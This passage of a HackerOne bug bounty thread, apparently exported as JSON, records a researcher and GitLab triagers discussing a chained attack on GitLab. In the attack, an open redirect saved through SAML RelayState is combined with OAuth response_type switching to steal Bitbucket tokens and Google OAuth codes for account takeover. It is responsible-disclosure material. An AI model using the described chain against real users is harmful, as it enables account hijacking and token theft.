7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=30f3564af0239af573346a7c444de94144814d104c8879fbc07adf4b37df5ad3"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21035508,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @h1_analyst_jan \n\n\nThanks for getting back at this. I can confirm things are working as reported.\n\nI believe you were logged into your own gitlab account and forgot to logout of it using the first button.\nhttps://witcoat.com/gitlab_o534fd753g/lab.html\n\nif you are not logged into your own gitlab account, then you may use second and third button directly.\n\n{F2262395}\n\n\n\nLet me know if you need any more information or if i missed something.\nThanks\nBull",
      "automated_response": false,
      "created_at": "2023-03-30T09:51:40.081Z",
      "updated_at": "2023-03-30T09:51:40.081Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2262395,
          "filename": "Screen_Recording_2023-03-30_at_3.16.56_PM.mov",
          "type": "video/quicktime",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qvltr1igxdlp0l80x15ho8qo50ex?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2023-03-30_at_3.16.56_PM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2023-03-30_at_3.16.56_PM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8246e89b309daf6ca0ccb2b9fc045158724b5920faa76175ead2115d79c649e7"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21057459,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": null,
      "automated_response": false,
      "created_at": "2023-03-31T09:37:55.887Z",
      "updated_at": "2023-03-31T09:37:55.887Z",
      "additional_data": {
        "old_severity": "High (8.2)",
        "new_severity": "Medium (5.8)",
        "old_severity_id": 1924964,
        "new_severity_id": 1929283
      },
      "actor": {
        "username": "h1_analyst_jan",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_jan",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/r0oas02hu1jrgp0gtezdaikmofag/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21057462,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugPendingProgramReview",
      "message": "Hello @bull,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks,\n@h1_analyst_jan",
      "automated_response": false,
      "created_at": "2023-03-31T09:38:00.070Z",
      "updated_at": "2023-03-31T09:38:00.070Z",
      "actor": {
        "username": "h1_analyst_jan",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_jan",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/r0oas02hu1jrgp0gtezdaikmofag/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21132070,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bull,\n\nThank you for your detailed report. I am unable to understand the prerequisites of the attack. From what I understand so far with your PoC, this will first require the victim to sign in with a malicious SAML service provider to \"save\" the open redirect? Could you also attach a detailed and realistic step-by-step attack scenario on how this can affect unwitting GitLab users?\n\n> This chain can be used to steal third party access token login with google, github, bitbucket, twitter, salesforce ....... etc\n\nPlease provide a PoC for these Oauth providers as well.\n\nThanks,\n@ameya_gitlab ",
      "automated_response": false,
      "created_at": "2023-04-05T04:43:13.292Z",
      "updated_at": "2023-04-05T04:44:34.732Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21140266,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hey @ameya_gitlab ,\n\n\nAppreciate you getting back at this. First of all Thank you for asking me for POC for these Other Oauth providers, as i was going through them one by one, i realised, this is not just simple token stealing, but take be used to takeover gitlab accounts using specifically `Login with Google`\n\n\nLets just clear out prerequisites or any other doubts you may have and then we can jump into how this can be used to takeover GitLab account using `sign in with Google`\n\n>I am unable to understand the prerequisites of the attack. From what I understand so far with your PoC, this will first require the victim to sign in with a malicious SAML service provider to \"save\" the open redirect?\n\n\nIn real attack, this will **not** at all require victim to sign in with a malicious service provider. The fact that you had to log in into my okta service provider, is just that, i am trying to securely share my SAML login with you while making the triage process easier, so that you can skip the SAML setup for reproduction purposes etc.\n\nWhile the victim is logging into my gitlab group, to redirect him out of gitlab.com , i exchanged all the certificate fingerprint and all other configs with gitlab at the SSO settings page\n{F2275037}\n\nNow i have the private key for this certificate, and i can sign SAML on my terms, and gitlab trust it (but just to log user into my group) , so now instead of logging into service provider,(in real world) i could server side sign it and embed `SAMLResponse` and malicious `RelayState` post form into the malicious exploit url . \n\nto make everything easier on both side while sharing securly, i gave the credentials and url which would return the signed response with our RelayState. (hope this make sense, and correct me if that was not your question).\n\n>Could you also attach a detailed and realistic step-by-step attack scenario on how this can affect unwitting GitLab users?\n\nthe realistic steps would be : (just what you see in the video)\n\n* user is logged into google or bitbucket\n\n* user clicks with above malicious link from attacker and oauth flow is abused\n\nfor bitbucket: \n> this can be used to steal access token, which can be used to steal all the bitbucket account data which user trusted with gitlab while logging into gitlab with bitbucket, or while import repositories from bitbucket into gitlab(either of them, makes the user exploitable)\n\n{F2260558}\n\n\nfor google:\n> this can be used to steal code, which can be used by an attacker to log into victim's gitlab account (account takeover), whoever uses `login with google`\n\n\n\n\n# Account takeover with Login with Google:\n\nWe will be using multiple response type to fetch code into the url hash instead of query so that it can be followed outside gitlab.com while multiple redirects happen:\n\nas [specifications](https://openid.net/specs/oauth-v2-multiple-response-types-1_0-09.html#Encoding) say:\n\n>If, in a request, `response_type` includes only values that require the server to return data fully encoded within the query string then the returned data in the response >for this multiple-valued `response_type` MUST be fully encoded within the query string. This recommendation applies to both success and error responses.\n>\n>If, in a request, `response_type` includes any value that requires the server to return data fully encoded within the fragment then the returned data in the response for this multiple-valued `response_type` MUST be fully encoded within the fragment. This recommendation applies to both success and error responses.\n\n\n\nHere is the [blog post](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#response-type-response-mode-switching) by fransrosen explaining in details why this is important.\n\n\n{F2275072}\n\n\nso using `response_type=id_token,code` instead of `&response_type=code` code can be retained into the url hash while redirecting, but also this was redirected to the appropriate `redirect_uri` i.e `https://gitlab.com/users/auth/google_oauth2/callback` by google, later this can be used to log into gitlab with oauth flow from attacker.\n\n\n\nhere is the poc url specifically for `sign in with google` : https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/plo.html\n(form submission can also be automated with js to make this one click, this is so that you can observe each step)\n\nhere is the following video attacking:\n{F2275109}\n\n\n\n\nplease let me know if you need any more information or if i missed something\nthanks\nbull",
      "automated_response": false,
      "created_at": "2023-04-05T13:51:34.744Z",
      "updated_at": "2023-04-05T13:51:34.744Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2275109,
          "filename": "Screen_Recording_2023-04-05_at_6.14.55_PM.mov",
          "type": "video/quicktime",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kxjntt7yv79xh1r6tvl37vmfox2s?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2023-04-05_at_6.14.55_PM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2023-04-05_at_6.14.55_PM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907bce18f72bcaafabb44427198ff7aea0c913a07c9f3057435f90401eb79f52"
        },
        {
          "id": 2275072,
          "filename": "Screenshot_2023-04-05_at_6.58.33_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5r3063zdujf219osayhffwzcg72o?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-04-05_at_6.58.33_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-04-05_at_6.58.33_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ac50586153c5fa355466a706a32e3c13109406f90d7d0e7c0bf4a1deb139c85f"
        },
        {
          "id": 2275037,
          "filename": "Screenshot_2023-04-05_at_6.40.10_PM.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6ojfqrdnxfngye711z4hrxjarzsn?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2023-04-05_at_6.40.10_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2023-04-05_at_6.40.10_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=826904b89e3132e59859bd147e83a4bf37698768ae6cea0856510fb69dffc761"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21169289,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bull,\n\nThank you for getting back with the detailed explanation and the Google exploit. \n> so now instead of logging into service provider,(in real world) i could server side sign it and embed SAMLResponse and malicious RelayState post form into the malicious exploit url .\n\nPlease provide a PoC where I do not need to login into any SAML provider, to establish that this step is not required.\n\nThanks,\n@ameya_gitlab ",
      "automated_response": false,
      "created_at": "2023-04-07T05:00:19.561Z",
      "updated_at": "2023-04-07T05:00:19.561Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21174415,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @ameya_gitlab ,\n\n\nThanks for getting back at this.\n\n\n> Please provide a PoC where I do not need to login into any SAML provider, to establish that this step is not required.\n\nSure. why not?\nhere is the login url: https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/sso.php?RelayState=\n**please note that the above url is only valid until 10th April**\n\n\nhere is the step by step poc with updated signin url:\n\nhttps://witcoat.com/gitlab_o534fd753g/bdfey363f9q/zlo.html\n\n\n\nhere is the video trying them out: (no need to login in into any service provider):\n\n{F2279236}\n\n\nPlease let me know if you need anything else.",
      "automated_response": false,
      "created_at": "2023-04-07T10:32:07.784Z",
      "updated_at": "2023-04-07T10:32:07.784Z",
      "actor": {
        "username": "bull",
        "cleared": true,
        "verified": true,
        "url": "/bull",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/102/224/c7a38e937595fb38aba8f664ca35626c15243a0d_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2279236,
          "filename": "Screen_Recording_2023-04-07_at_3.53.49_PM.mov",
          "type": "video/quicktime",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4quxcqqj5a3oxsz6i8kwvgqal1xh?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2023-04-07_at_3.53.49_PM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2023-04-07_at_3.53.49_PM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXL2TV4JY%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065504Z&X-Amz-Expires=3276&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC6gxJ2Fgorv1CGF8se8AzeZarVMBLse4f%2Fv1LWZPPIbAIhAIe13AyRf7KoGQmk0MZsohJbY2mmh8fOJTnvWpEfZdoaKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5IgzcVzLSCfqhl64LbOoqjgXEg5yJowTgB6h0qoSj2KgKW%2FmO5%2Fb22frcKudampbs5LOCE%2Bl%2BTzvnLlh8zfsY9Insep7fcRUtb%2F%2Ba%2BgVdyMNa5k1sDhv63hYhXctRIhsubT4u%2BKuj6RCLHJY3dXzqK889huk5FJgsPR61WQfBkCfEQC8iLWjotXcQ24R5LylVYeAdAfDTBXiQl0%2Ba%2BsgeYEoj5X7QnFy0DX62VlrQT9rRHS%2BIe%2F4W0R8qQqELu9%2Fy2ZB8v7fPotewALFtGyLN4MQlE6%2BVl4GI35jgi1WT1qpLseSJ1p25J9nDGI0NHpdpJMKM5E5L7%2B7%2BsgEZUdYkWeEF%2BG2KgYj%2BzPGsOkRbev%2BBTlxTRT56vZh2BRi%2B7sFDgxdE9NJnxxH8jgVf1E5Ct0dLWQGpSMpZO8f%2BytRKMtjz6dgiSnO6iQESsRG4RRbxtSJ8Q8G0cVH7H8u%2BerokbE32PnqwkjuLNE0gsVc8huN5G1P8RNdp8r2ey4m2akCouacY8lQOFlyPG6vZt7JBfvSkSSeDsbntLEW%2B5kw6heg5vyz4VHHUBtamMvWasHge4MYAJCQwVSCo6Bi9PphSSWqY5Fxm%2BNXcTJ7TPGzYD3k3A56HihvKmfDPJeQgsOSp4EIHxZNlD5RO4k6VuxWFSWHmfDKgnWPobSypItRUebo7ysrxPeAhcG2U%2FtrFJ6c2ZosszPY%2FH59x4%2BfV5NBF2Jd7i8ENzcU7YQRNAjqwgIPfx%2FneHwZpkr%2Byxa%2BJJ2OmPe9rY%2FzN0lLqdrjIoYEeo3EMS9SVaDjVLU4VHKBE7jBWfPqA4KtQ0k9%2BOXLZyOzFIt1Tw4LmwjOTNELjF19oHFeBobYeeWBAaW8yAqvbuqQ9vAW%2BzNZlxiXed4sFhe4whIa5qAY6sAHLr4%2F9PHLdkIzOpDMedWUTk8aJzmnJUfV88BMC69XqLdUVuF5lgOfwWykGqhdHJcdd3HpN5u%2FHo%2B83%2BGJoiPKJmXhOQe9FM5DVP4kYrIwsbZ4L0BTJd%2FkqEwGkjVprA7%2BEXsI%2FPKeL8nhijDijPctTq5akS%2FashM8yWrO3PeZId%2BcQDzw0vMnnxt3w6el0izvNlb%2FxKQ2ULn%2F8qTT7eIADRYt52%2BO3AJVBd%2F8I3XgSyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a35113a62272af894df0f6c49a2ac598c66d3d599084b8d977db8a7cb3e3480"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 21176430,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @bull,\n\nThank you for getting back so quickly. Navigating directly to https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/sso.php?RelayState= gives me the following prompt, which kills the attack chain: {F2279518}\n\nAnd using your PoC at https://witcoat.com/gitlab_o534fd753g/bdfey363f9q/zlo.html, I am logged in into a completely random account called \"@skinnysaml\". Please check this behaviour:\n{F2279525}\n\nBest,\n@ameya_gitlab",
      "automated_response": false,
      "created_at": "2023-04-07T14:11:11.329Z",
      "updated_at": "2023-04-07T14:11:11.329Z",
      "actor": {
        "username": "ameya_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/ameya_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ollldnbeou8kry1g922mk4altzqz/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 2279525,
